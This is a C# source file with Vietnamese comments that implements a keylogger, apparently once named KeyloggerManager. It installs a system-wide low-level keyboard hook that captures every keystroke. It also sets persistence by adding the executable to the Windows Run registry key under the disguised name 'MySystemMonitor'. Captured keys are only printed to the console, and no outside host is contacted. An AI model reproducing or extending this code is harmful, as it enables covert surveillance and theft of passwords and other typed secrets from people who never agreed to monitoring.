using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;

// Lỗi CS0246 (KeyloggerManager not found) cũng sẽ được giải quyết nếu nó là tên Class chính của bạn.

namespace AgentForMe.Services
{
    // Bắt buộc phải có một Class để chứa các thành viên.
    public class KeyboardHook
    {
        // Khai báo _hookID để lưu trữ con trỏ hook (Hook Handle), 
        // cần thiết cho UnhookWindowsHookEx và CallNextHookEx (Giải quyết lỗi "_hookID does not exist")
        private static IntPtr _hookID = IntPtr.Zero;

        // =================================================================
        // KHAI BÁO CẤU TRÚC VÀ HẰNG SỐ WINAPI
        // =================================================================
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // DllImport (Phải là static extern và nằm trong class)
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // =================================================================
        // CÁC PHƯƠNG THỨC HOẠT ĐỘNG
        // =================================================================

        // KHỞI TẠO HOOK
        public IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            // Lỗi CS0103 SetWindowsHookEx, WH_KEYBOARD_LL, GetModuleHandle được giải quyết 
            // vì chúng nằm trong phạm vi của lớp.
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                return _hookID;
            }
        }

        // HÀM CALLBACK XỬ LÝ SỰ KIỆN BÀN PHÍM
        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Lỗi WM_KEYDOWN, WM_SYSKEYDOWN được giải quyết
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);

                Console.WriteLine($"Phim đa đuoc bat: {(Keys)vkCode}");
            }

            // Lỗi CallNextHookEx và _hookID được giải quyết
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // ĐOẠN CODE THIẾT LẬP TỰ KHỞI ĐỘNG (PERSISTENCE)
        public void SetPersistence()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                rk.SetValue("MySystemMonitor", Application.ExecutablePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Không thể thiết lập Persistence: " + ex.Message);
            }
        }
    }
}